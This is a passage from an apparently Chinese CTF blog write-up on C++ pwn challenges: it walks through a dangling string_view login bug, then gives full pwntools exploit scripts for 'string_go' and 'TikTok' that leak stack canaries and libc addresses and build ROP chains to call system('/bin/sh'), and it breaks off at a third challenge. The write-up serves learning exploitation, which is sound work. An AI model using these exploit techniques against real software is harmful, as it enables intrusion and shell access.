class="hljs-comment">“🍴😵‍💫🥴😤😡🤬”</span><br><span class="hljs-comment">*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;exception&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string_view&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unordered_map&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;functional&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><br><span class="hljs-function">string <span class="hljs-title">getInput</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    string res;<br>    <span class="hljs-built_in">getline</span>(cin, res);<br>    <span class="hljs-keyword">if</span> (res.<span class="hljs-built_in">size</span>() &gt; <span class="hljs-number">64</span>)<br>        <span class="hljs-keyword">throw</span> std::<span class="hljs-built_in">runtime_error</span>(<span class="hljs-string">&quot;Invalid input&quot;</span>);<br>    <span class="hljs-keyword">while</span> (!res.<span class="hljs-built_in">empty</span>() &amp;&amp; res.<span class="hljs-built_in">back</span>() == <span class="hljs-string">&#x27;\n&#x27;</span>)<br>        res.<span class="hljs-built_in">pop_back</span>();<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><br><span class="hljs-type">bool</span> allow_admin = <span class="hljs-literal">false</span>;<br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">splitToken</span><span class="hljs-params">(string_view str, string_view delim)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (!allow_admin &amp;&amp; str.<span class="hljs-built_in">find</span>(<span class="hljs-string">&quot;admin&quot;</span>) != str.npos)<br>        <span class="hljs-keyword">throw</span> std::<span class="hljs-built_in">invalid_argument</span>(<span class="hljs-string">&quot;Access denied&quot;</span>);<br>    vector&lt;string_view&gt; res;<br>    <span class="hljs-type">size_t</span> prev = <span class="hljs-number">0</span>, pos = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">do</span><br>    &#123;<br>        pos = str.<span class="hljs-built_in">find</span>(delim, prev);<br>        <span class="hljs-keyword">if</span> (pos == std::string::npos)<br>        &#123;<br>            pos = str.<span class="hljs-built_in">length</span>();<br>        &#125;<br>        res.<span class="hljs-built_in">push_back</span>(str.<span class="hljs-built_in">substr</span>(prev, pos - prev));<br>        prev = pos + delim.<span class="hljs-built_in">length</span>();<br>    &#125; <span class="hljs-keyword">while</span> (pos &lt; str.<span class="hljs-built_in">length</span>() &amp;&amp; prev &lt; str.<span class="hljs-built_in">length</span>());<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">auto</span> <span class="hljs-title">parseUser</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">auto</span> tok_ring = <span class="hljs-built_in">splitToken</span>(<span class="hljs-built_in">getInput</span>(), <span class="hljs-string">&quot;:&quot;</span>);<br>    <span class="hljs-keyword">if</span> (tok_ring.<span class="hljs-built_in">size</span>() != <span class="hljs-number">2</span>)<br>        <span class="hljs-keyword">throw</span> std::<span class="hljs-built_in">invalid_argument</span>(<span class="hljs-string">&quot;Bad login token&quot;</span>);<br>    <span class="hljs-keyword">if</span> (tok_ring[<span class="hljs-number">0</span>].<span class="hljs-built_in">size</span>() &lt; <span class="hljs-number">4</span> || tok_ring[<span class="hljs-number">0</span>].<span class="hljs-built_in">size</span>() &gt; <span class="hljs-number">16</span>)<br>        <span class="hljs-keyword">throw</span> std::<span class="hljs-built_in">invalid_argument</span>(<span class="hljs-string">&quot;Bad login name&quot;</span>);<br>    <span class="hljs-keyword">if</span> (tok_ring[<span class="hljs-number">1</span>].<span class="hljs-built_in">size</span>() &gt; <span class="hljs-number">32</span>)<br>        <span class="hljs-keyword">throw</span> std::<span class="hljs-built_in">invalid_argument</span>(<span class="hljs-string">&quot;Bad login password&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">make_pair</span>(tok_ring[<span class="hljs-number">0</span>], tok_ring[<span class="hljs-number">1</span>]);<br>&#125;<br><span class="hljs-type">const</span> unordered_map&lt;string_view, function&lt;<span class="hljs-type">void</span>(string_view)&gt;&gt; handle_admin = &#123;<br>    &#123;<span class="hljs-string">&quot;admin&quot;</span>, [](<span class="hljs-keyword">auto</span>)<br>     &#123;<br>         <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/readflag&quot;</span>);<br>     &#125;&#125;,<br>    &#123;<span class="hljs-string">&quot;?&quot;</span>, [](<span class="hljs-keyword">auto</span>)<br>     &#123;<br>         cout &lt;&lt; <span class="hljs-string">&quot;Enjoy :)&quot;</span> &lt;&lt; endl;<br>         cout &lt;&lt; <span class="hljs-string">&quot;https://www.bilibili.com/video/BV1Nx411S7VG&quot;</span> &lt;&lt; endl;<br>     &#125;&#125;&#125;;<br><span class="hljs-keyword">constexpr</span> <span class="hljs-keyword">auto</span> handle_guest = [](<span class="hljs-keyword">auto</span>)<br>&#123;<br>    cout &lt;&lt; <span class="hljs-string">&quot;Hello guest!&quot;</span> &lt;&lt; endl;<br>&#125;;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">auto</span> [username, password] = <span class="hljs-built_in">parseUser</span>();<br>    cout &lt;&lt; <span class="hljs-string">&quot;Enter &#x27;login&#x27; to continue, or enter &#x27;quit&#x27; to cancel.&quot;</span> &lt;&lt; endl;<br>    <span class="hljs-keyword">auto</span> choice = <span class="hljs-built_in">getInput</span>();<br>    <span class="hljs-keyword">if</span> (choice == <span class="hljs-string">&quot;quit&quot;</span>)<br>    &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;bye&quot;</span> &lt;&lt; endl;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">auto</span> it = handle_admin.<span class="hljs-built_in">find</span>(username); it != handle_admin.<span class="hljs-built_in">end</span>())<br>    &#123;<br>        it-&gt;<span class="hljs-built_in">second</span>(password);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">handle_guest</span>(password);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>怎么说呢，👴只能看出个大概运行逻辑，但👴是真的找不到洞</p><p>👴只能求助👴高中的OI👴（国一👴！！）</p><p><img src="/img/C++/0.png" alt="img"></p><p>问题出现在 <code>main</code> 函数中。一旦 <code>parseUser</code> 返回，<code>splitToken</code> 函数中创建的字符串就超出了它们的作用域，因为这些字符串是局部变量。因此，<code>username</code> 和 <code>password</code> 变量成为了悬垂指针（Dangling Pointers），它们引用的内存已经无效。</p><p>所以第二次输入到choice变量的时候，就可以复用这个悬垂指针，看似指向username 和 password，实则里面的内容已经是choice，所以输入choice的时候输入”admin”就行了。，</p><p>👴以为👴又行了，结果试了一下发现八行。👴很恼火，就去摸鱼了，摸着摸着就摸到了纯真✌的博客（<a href="https://zqy.ink/2023/05/12/dingjiqiandao/">@张清越</a>），了解了SSO机制对于不同长度的字符串的处理。</p><p>同时string_view会记录字符串的size，因为admin的size是5，所以第一次login的时候username的size也应该是5.</p><p>👴又自己写了一个poc，应该更好理解一点</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#include &lt;iostream&gt;</span><br><span class="hljs-comment">#include &lt;string_view&gt;</span><br><span class="hljs-comment">#include &lt;cstring&gt;</span><br><span class="hljs-comment">#include &lt;vector&gt;</span><br><br>std::string_view CreateAndReturnPointer() &#123;<br><br>   std::string res;<br>   getline(std::cin,res);<br>   std::string_view strView(res);<br><br>   <span class="hljs-keyword">return</span> strView;<br>&#125;<br><br><span class="hljs-built_in">int</span> main() &#123;<br><br>   std::string_view view = CreateAndReturnPointer();<br>   <br>   std::string res;<br>   getline(std::cin,res);<br><br>   std::cout &lt;&lt; <span class="hljs-string">&quot;now the content of string_view is :&quot;</span> &lt;&lt; view.substr(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>) &lt;&lt; std::endl;<br>   <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&#x27;./test&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x80</span>)<br>sleep(<span class="hljs-number">0.1</span>)<br>p.sendline(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x80</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p>按理来说，view指向的字符串应该是b’a’*0x80</p><p>但是刚出CreateAndReturnPointer函数，储存字符串的chunk就被free了</p><p><img src="/img/C++/1.png" alt="img"></p><p>所以后面的getline获取输入的时候，一但输入size和第一次输入size相等，这个chunk又会被启用，但是，其中的内容已经变了，而view并不知道家被偷了。</p><p>所以最后的结果便是</p><p><img src="/img/C++/2.png" alt="img"></p><p>噫，👴终于懂了。</p><h2 id="西湖论剑2021-string-go"><a href="#西湖论剑2021-string-go" class="headerlink" title="西湖论剑2021 string_go"></a>西湖论剑2021 string_go</h2><p>👴在翻库存的时候发现了一道21年的西葫芦🗡的C++</p><p>就拿过来练练手</p><p>程序本身实现了一个只能进行加减运算的clac，当计算结果为3时可以进入lative_func</p><p><img src="/img/C++/3.png" alt="img"></p><p>后面经过动调发现,字符串-8的地方存放的是输出时的size，同时idx可以为负数，那就能把size给改了，泄露出栈上的数据后用memcpy完成栈溢出。</p><p><img src="/img/C++/4.png" alt="img"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./string_go&#x27;</span>)<br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;182.92.164.148&#x27;</span>, <span class="hljs-number">48649</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./string_go&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br>sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br>gdb.attach(p,<span class="hljs-string">&quot;b *$rebase(0x23A9)\nc\n&quot;</span>)<br>sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;aaaaaaaa&#x27;</span>)<br><br><br>sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;\x01&#x27;</span>)<br>ru(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>rc(<span class="hljs-number">0x18</span>)<br>data1 = rc(<span class="hljs-number">0x18</span>)<br>canary = u64(rc(<span class="hljs-number">8</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>leak(<span class="hljs-string">&quot;canary&quot;</span>,canary)<br><br>rc(<span class="hljs-number">8</span>)<br>elf_base = u64(rc(<span class="hljs-number">8</span>)) - <span class="hljs-number">0x1760</span><br>leak(<span class="hljs-string">&quot;elf_base&quot;</span>,elf_base)<br><br>pop_rdi = <span class="hljs-number">0x0000000000003cf3</span> + elf_base<br>main = elf_base + <span class="hljs-number">0x24bd</span><br><br>data2 = rc(<span class="hljs-number">0x18</span>)<br>p.recv()<br>payload = <span class="hljs-string">b&#x27;1&#x27;</span>*<span class="hljs-number">0x18</span> + p64(canary) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + \<br>          p64(pop_rdi) + p64(elf_base + elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]+elf_base) + p64(main)<br>sl(payload)<br>libc.address = u64(ru(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>leak(<span class="hljs-string">&quot;libc&quot;</span>,libc.address)<br>sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;-7&#x27;</span>)<br>sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;aaaaaaaa&#x27;</span>)<br>sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;\x01&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;1&#x27;</span>*<span class="hljs-number">0x18</span> + p64(canary) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + \<br>          p64(elf_base + <span class="hljs-number">0x00000000000014ce</span>)+ p64(pop_rdi)+ p64(<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))) + p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>])<br>sl(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="ByteCTF2020-TikTok"><a href="#ByteCTF2020-TikTok" class="headerlink" title="ByteCTF2020 TikTok"></a>ByteCTF2020 TikTok</h2><p>在A3👴博客中找到的题，C++逆向就是出生的太阳，逼样的晚意。</p><p>题目一打开，楽，真会整活</p><p><img src="/img/C++/5.png" alt="img"></p><p>功能多的一批，于是👴就勤勤肯肯把所有功能都写了，结果👴在delete，输入密码的时候，发现密码输入错误直接把栈里面的数据带出来了，👴就知道这把有了。因为delete这个功能有几个花指令，不能傻瓜create function，看不了伪代码。于是👴进gdb看到了memcpy，甚至输入错位还有输出，人还怪好的。那就是泄露数据后栈溢出，和前一题一样的套路。</p><p>（所以这么多fuction你是一点没用啊）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./tiktok&#x27;</span>)<br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;182.92.164.148&#x27;</span>, <span class="hljs-number">48649</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./tiktok&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br>menu = <span class="hljs-string">b&#x27;$ &#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">password</span>):<br>    sla(<span class="hljs-string">b&#x27;:&#x27;</span>,password)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">sex,<span class="hljs-built_in">type</span>,age,name</span>):<br>    payload = <span class="hljs-string">b&#x27;Add &#x27;</span><br>    payload += sex + <span class="hljs-string">b&#x27; &#x27;</span><br>    payload += <span class="hljs-built_in">type</span> + <span class="hljs-string">b&#x27; &#x27;</span><br>    payload += <span class="hljs-built_in">str</span>(age).encode() + <span class="hljs-string">b&#x27; &#x27;</span><br>    payload += name<br>    sla(menu,payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">sex</span>):<br>    payload = <span class="hljs-string">b&#x27;Show&#x27;</span> + <span class="hljs-string">b&#x27; &#x27;</span><br>    payload += sex<br>    sla(menu,payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">info</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    payload = <span class="hljs-string">b&#x27;Info &#x27;</span> + <span class="hljs-built_in">id</span><br>    sla(menu,payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    payload = <span class="hljs-string">b&#x27;Delete &#x27;</span> + <span class="hljs-built_in">id</span><br>    sla(menu, payload)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">convert</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    payload = <span class="hljs-string">b&#x27;Convert &#x27;</span> + <span class="hljs-built_in">id</span><br>    sla(menu, payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>,name</span>):<br>    payload = <span class="hljs-string">b&#x27;Edit &#x27;</span><br>    payload += <span class="hljs-built_in">id</span> + <span class="hljs-string">b&#x27; &#x27;</span><br>    payload += name<br>    sla(menu,payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">follow</span>(<span class="hljs-params">action,id1,id2</span>):<br>    payload = <span class="hljs-string">b&#x27;Follow &#x27;</span><br>    payload += action + <span class="hljs-string">b&#x27; &#x27;</span><br>    payload += id1 + <span class="hljs-string">b&#x27; &#x27;</span><br>    payload += id2 + <span class="hljs-string">b&#x27; &#x27;</span><br>    sla(menu, payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">clone</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>,name</span>):<br>    paylaod = <span class="hljs-string">b&#x27;Clone &#x27;</span><br>    paylaod += <span class="hljs-built_in">id</span> + <span class="hljs-string">b&#x27; &#x27;</span><br>    paylaod += name<br>    sla(menu,paylaod)<br><br>login(<span class="hljs-string">b&#x27;TikTokAdmin&#x27;</span>)<br><br><br>delete(<span class="hljs-string">b&#x27;W6&#x27;</span>)<br>login(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">9</span>)<br>ru(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">9</span>)<br>canary = u64(rc(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>leak(<span class="hljs-string">&quot;canary&quot;</span>,canary)<br>login(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span> + p64(canary))<br><br><br>delete(<span class="hljs-string">b&#x27;W6&#x27;</span>)<br>login(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br>ru(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br>stack_value1 = u64(rc(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>leak(<span class="hljs-string">&quot;stack_value1&quot;</span>,stack_value1)<br>login(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span> + p64(canary) + p64(stack_value1))<br><br>delete(<span class="hljs-string">b&#x27;W6&#x27;</span>)<br>login(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x40</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br>ru(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br>stack_value2 = u64(rc(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>leak(<span class="hljs-string">&quot;stack_value2&quot;</span>,stack_value2)<br>login(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span> + p64(canary) + p64(stack_value1) + p64(stack_value2))<br><br>elf_base = stack_value2 - <span class="hljs-number">0x39a0</span><br>pop_rdi = elf_base + <span class="hljs-number">0x000000000000ea73</span><br>main = elf_base + <span class="hljs-number">0x49f3</span><br><br><br>delete(<span class="hljs-string">b&#x27;W6&#x27;</span>)<br>login(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br>ru(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br>stack_value3 = u64(rc(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>leak(<span class="hljs-string">&quot;stack_value2&quot;</span>,stack_value3)<br>payload = p64(canary) + p64(stack_value1) + p64(stack_value2) + p64(stack_value3) + \<br>          p64(pop_rdi) + p64(elf_base + elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p64(elf_base + elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p64(main)<br>login(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span> + payload)<br><br>libc.address = u64(ru(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>leak(<span class="hljs-string">&quot;libc&quot;</span>,libc.address)<br><br>login(<span class="hljs-string">b&#x27;TikTokAdmin&#x27;</span>)<br><br><br>delete(<span class="hljs-string">b&#x27;W6&#x27;</span>)<br>login(<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>payload = p64(canary) + p64(stack_value1) + p64(stack_value2) + p64(stack_value3) + \<br>          p64(elf_base + <span class="hljs-number">0x00000000000096c3</span>) + p64(pop_rdi) + p64(<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))) + p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>])<br>login(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span> + payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="DCTF2017-flex🤪"><a href="#DCTF2017-flex🤪" class="headerlink" title="DCTF2017 flex🤪"></a>DCTF2017 flex🤪</h2><p>作为一个没打过OI，更不会C++的蒻笱，异常处理这玩意直接涉及到笔者盲区了。</p><p>首先这题不能说是一个纯种的C++ pwn题，只能说是一个C和C++的<del>杂种</del>杂修~~</p><p>IDA打开，选项4很诱人，但仔细一看基本上利用不了，难受，就像打了脚没🐍出来一样难受😰</p><p>然后选项3是个FW，👴只能看function1&amp;2了</p><p><img src="/img/C++/6.png" 